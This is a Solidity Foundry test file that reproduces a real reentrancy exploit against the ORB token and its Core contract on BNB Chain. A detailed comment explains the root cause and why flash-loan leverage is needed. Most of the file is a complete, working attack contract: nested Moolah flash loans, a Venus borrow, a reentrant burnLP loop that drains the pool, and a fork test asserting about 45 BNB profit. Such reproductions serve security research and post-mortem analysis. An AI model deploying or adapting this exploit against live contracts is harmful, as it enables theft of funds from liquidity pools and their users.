// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// ORB (ORBToken / ORBCore) - refund-before-sell reentrancy + whitelisted tax-free Core sells + burnLP pool
// depletion, amplified by a Venus + Moolah leverage staging phase - BNB Chain. Attacker net ~44.9-45 BNB.
//
// Attack tx      : 0x5e6b33b7d69b505d8ae6e50ca6967e13bf513b61593d29011dbcc6d134515b34 (block 121296110)
// Attacker EOA   : 0xd8B49172B1A33e77C2619a78e08471FaCFf5dAd3  (holds 3,483 ORB pre-attack)
// Attack contract: 0x4f33733a40FAE6C19c3A4Faf9BC08cE9a1806831
// ORBToken       : 0xC4D27261C06407053Cad16Cb825ecc0eEE7ee7d7  (verified)
// ORBCore        : 0x24B6308AB84B182d0598b73d21a42f4C2bb33C18  (verified; whitelisted on the token)
// Pair ORB/WBNB  : 0x64fad72e5dde70B2960497744B348FD64Cb4788c  (PancakeV2, token0 = WBNB)
// Moolah pool    : 0x8f73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C  (0% flashLoan; holds exactly 241,591 WBNB + 3,145 BTCB)
// Venus VBNB     : 0xA07c5b74C9B40447a954e1466938b865b6BBea36
// Venus VBTCB    : 0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B
// Comptroller    : 0xfD36E2c2a6789Db23113685031d7F16329158384
// Router         : 0x10ED43C718714eb63d5aA57B78B54704E256024E
//
// ROOT CAUSE (verified against source + the full on-chain trace):
//   1. ORBToken.receive() forwards BNB into ORBCore.addPoolAndSell() with NO reentrancy guard on the path.
//   2. addPoolAndSell()'s sell branch refunds the BNB to the caller (safeTransferETH(account, BNBValue))
//      BEFORE _sellToken() runs, and _sellToken() itself refunds userBNB to the caller BEFORE its final
//      burnLP() - two unguarded re-entry points. The attacker's receive()/fallback re-enters at both.
//   3. ORBCore is whitelisted on ORBToken, so pair<->Core transfers skip the token's transfer burn tax:
//      _sellToken() pulls the caller's ORB tax-free and swaps it, and the big pool buy routes ORB to Core
//      (any non-Core buyer hits `revert('not buy')` in ORBToken._transfer).
//   4. burnLP(amount) burns ORB straight out of the Pair's own reserve and calls sync(), if amount is under
//      20% of the pair's ORB balance - permanently shrinking the ORB side of the reserve.
//
// WHY THE LEVERAGE IS REQUIRED (the piece a naive reentrancy-only PoC misses, confirmed on-chain):
//   The pair's real reserve is only 45.3 WBNB / 5.826M ORB, and the attacker owns just 3,483 ORB. burnLP is
//   capped at 20% of the pair's ORB balance per call, and each _sellToken can only sell as much ORB as the
//   attacker holds - so the attacker's tiny stack can never burn down a 5.826M-ORB reserve. The fix is to
//   first BUY OUT almost all of the pool's ORB with a huge, temporary WBNB position (241,591 WBNB flash-loaned
//   from Moolah PLUS 260,000 BNB borrowed from Venus against 3,145 BTCB that is itself Moolah-flash-loaned),
//   pushing the pair to ~448,325 WBNB / ~590 ORB. Now the reentrant burnLP loop can grind the ~590 ORB down
//   to dust (WBNB reserve untouched), and a final small ORB sell drains almost the entire inflated WBNB side.
//   Every borrowed leg is repaid at the end; the net that remains is exactly the pool's real ~45 WBNB.
//
//   Reentrancy ordering that makes it work (why a flat loop cannot): each _sellToken does swap -> userBNB
//   refund -> burnLP. Re-entering at the userBNB refund pushes the next level's swap to run BEFORE this
//   level's burnLP. So on the way DOWN every swap executes against the still-full pool (harmless), the big
//   buy fires at the deepest level, and on the way UP every burnLP executes against the now-emptied pool -
//   depleting it geometrically. A flat post-buy loop would instead swap ORB back into the emptied pool each
//   iteration and destroy the setup.
//
// Numbers are reproduced live on a fork of the parent block, not asserted from the trace.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWBNB is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IPair {
    function getReserves() external view returns (uint112 r0, uint112 r1, uint32 ts);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
}

interface IRouter {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IComptroller {
    function enterMarkets(address[] calldata) external returns (uint256[] memory);
}

interface IVToken {
    function mint(uint256) external returns (uint256);
    function borrow(uint256) external returns (uint256);
    function repayBorrow() external payable;
    function redeemUnderlying(uint256) external returns (uint256);
}

contract ORBExploit {
    IERC20 internal constant ORB = IERC20(0xC4D27261C06407053Cad16Cb825ecc0eEE7ee7d7);
    address internal constant CORE = 0x24B6308AB84B182d0598b73d21a42f4C2bb33C18;
    IPair internal constant PAIR = IPair(0x64fad72e5dde70B2960497744B348FD64Cb4788c);
    IWBNB internal constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 internal constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IMoolah internal constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    IRouter internal constant ROUTER = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IComptroller internal constant COMPTROLLER = IComptroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IVToken internal constant VBNB = IVToken(0xA07c5b74C9B40447a954e1466938b865b6BBea36);
    IVToken internal constant VBTCB = IVToken(0x882C173bC7Ff3b7786CA16dfeD3DFFfb9Ee7847B);

    uint256 internal constant WBNB_LOAN = 241_591_119_849_192_237_224_966; // all of Moolah's WBNB
    uint256 internal constant BTCB_LOAN = 3_145_888_591_519_450_458_468; // all of Moolah's BTCB
    uint256 internal constant BORROW = 260_000 ether; // Venus BNB borrow against the BTCB collateral

    uint256 internal constant TRIGGER = 9 * 1e14; // 0.0009 BNB -> addPoolAndSell sell path, mulNumber = 9
    uint256 internal constant LEAVE = 600 ether; // ORB left in the pool by the big buy, then burnt to dust
    uint256 internal constant MAX_DEPTH = 70; // reentrancy depth; deeper = pool ORB ground closer to 0 = smaller drain residual

    address internal immutable owner;
    bool internal innerPhase;
    bool internal inLoop;
    bool internal bought;
    uint256 internal depth;

    constructor() {
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");
        MOOLAH.flashLoan(address(WBNB), WBNB_LOAN, ""); // outer
        uint256 bal = WBNB.balanceOf(address(this));
        WBNB.withdraw(bal);
        payable(owner).transfer(address(this).balance);
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == address(MOOLAH), "not moolah");
        if (!innerPhase) {
            innerPhase = true;
            MOOLAH.flashLoan(address(BTCB), BTCB_LOAN, ""); // nested BTCB flash loan
            WBNB.approve(address(MOOLAH), WBNB_LOAN); // repay outer
            return;
        }

        // ---- inner (BTCB) callback: build leverage, run the drain, repay ----
        // Venus: deposit the flash-loaned BTCB as collateral and borrow BNB against it.
        BTCB.approve(address(VBTCB), BTCB_LOAN);
        address[] memory mkts = new address[](1);
        mkts[0] = address(VBTCB);
        COMPTROLLER.enterMarkets(mkts);
        require(VBTCB.mint(BTCB_LOAN) == 0, "mint fail");
        require(VBNB.borrow(BORROW) == 0, "borrow fail");
        WBNB.deposit{value: BORROW - 10 ether}(); // wrap borrowed BNB, keep 10 BNB native for the 0.0009 triggers

        _drain();

        // Repay Venus, then approve the inner BTCB flash loan back to Moolah.
        WBNB.withdraw(BORROW - address(this).balance); // top native back up to exactly BORROW
        VBNB.repayBorrow{value: BORROW}();
        VBTCB.redeemUnderlying(BTCB_LOAN);
        BTCB.approve(address(MOOLAH), assets);
    }

    function _drain() internal {
        WBNB.approve(address(ROUTER), type(uint256).max);
        ORB.approve(CORE, type(uint256).max); // let Core pull our ORB in _sellToken (tax-free, Core is whitelisted)
        depth = 0;
        bought = false;
        inLoop = true;
        _trigger(); // kick off the reentrant descent
        inLoop = false;
        _finalSell();
    }

    function _trigger() internal {
        (bool ok,) = address(ORB).call{value: TRIGGER}(""); // ORBToken.receive -> Core.addPoolAndSell (sell)
        require(ok, "trigger fail");
    }

    // Re-entry handler. Core hits us twice per level: the addPoolAndSell refund (== TRIGGER, fired before
    // _sellToken reads our balance) and the _sellToken userBNB refund (< TRIGGER, fired before burnLP).
    receive() external payable {
        if (!inLoop || msg.sender != CORE) return;
        if (msg.value == TRIGGER) {
            _topUpForLevel(depth); // size our ORB so this level's sell/burn matches the pool at its unwind
            return;
        }
        // userBNB refund: descend one more level, or fire the big buy at the bottom.
        if (depth < MAX_DEPTH) {
            depth++;
            _trigger();
        } else if (!bought) {
            bought = true;
            _bigBuy();
        }
        // returning lets this level's burnLP run against the emptied pool (unwind)
    }

    // Level d unwinds when the pool ORB will be ~ LEAVE * 0.8^(MAX_DEPTH - d). Size the sell so burnLP
    // (0.6 * sell) is just under 20% of that, i.e. sell ~ pool/3, balance = sell * 10 / 9 (mulNumber 9).
    function _topUpForLevel(uint256 d) internal {
        uint256 pool = LEAVE;
        uint256 n = MAX_DEPTH - d;
        for (uint256 i = 0; i < n; i++) {
            pool = pool * 4 / 5;
        }
        uint256 target = (pool / 3) * 10 / 9;
        if (target == 0) target = 1;
        uint256 bal = ORB.balanceOf(address(this));
        if (bal < target) {
            ORB.transferFrom(owner, address(this), target - bal); // pull from the attacker EOA, untaxed
        }
    }

    function _bigBuy() internal {
        uint256 poolOrb = ORB.balanceOf(address(PAIR));
        uint256 orbOut = poolOrb > LEAVE ? poolOrb - LEAVE : 0;
        if (orbOut == 0) return;
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(ORB);
        // Buy nearly all pool ORB, delivered to Core (only Core can receive a pair buy without reverting).
        ROUTER.swapTokensForExactTokens(orbOut, WBNB.balanceOf(address(this)), path, CORE, block.timestamp);
    }

    // Pool is now huge-WBNB / dust-ORB. Sell ORB straight into the pair (5% burn on the way in) and swap out
    // the inflated WBNB.
    function _finalSell() internal {
        bool wbnbIs0 = PAIR.token0() == address(WBNB);
        uint256 have = ORB.balanceOf(address(this));
        uint256 eoa = ORB.balanceOf(owner);
        if (eoa > 0) {
            ORB.transferFrom(owner, address(this), eoa);
            have += eoa;
        }
        if (have == 0) return;
        (uint112 r0, uint112 r1,) = PAIR.getReserves();
        (uint256 rW, uint256 rO) = wbnbIs0 ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        // 5% burn tax on transfer-to-pair; the pair receives 95% of `have`.
        uint256 inAfterTax = have * 95 / 100;
        ORB.transfer(address(PAIR), have);
        uint256 outW = (inAfterTax * 9975 * rW) / (rO * 10_000 + inAfterTax * 9975);
        if (outW >= rW) outW = rW - 1;
        if (wbnbIs0) {
            PAIR.swap(outW, 0, address(this), "");
        } else {
            PAIR.swap(0, outW, address(this), "");
        }
    }
}

contract ORB_exp is Test {
    IERC20 internal constant ORB = IERC20(0xC4D27261C06407053Cad16Cb825ecc0eEE7ee7d7);
    address internal constant ATTACKER = 0xd8B49172B1A33e77C2619a78e08471FaCFf5dAd3;

    function setUp() public {
        vm.createSelectFork("bsc", 121_296_109); // parent block of the exploit tx (121296110)
    }

    function testExploit() public {
        vm.startPrank(ATTACKER, ATTACKER);
        uint256 balBefore = ATTACKER.balance;

        ORBExploit exploit = new ORBExploit();
        ORB.approve(address(exploit), type(uint256).max); // attacker lets the contract pull its 3,483 ORB
        exploit.attack();

        uint256 profit = ATTACKER.balance - balBefore;
        vm.stopPrank();

        emit log_named_decimal_uint("attacker BNB profit", profit, 18);
        // Reproduces the reported ~44.9-45 BNB loss: essentially the pair's entire 45.318 WBNB reserve.
        assertApproxEqRel(profit, 45 ether, 0.03e18, "expected net-positive ~45 BNB");
    }
}
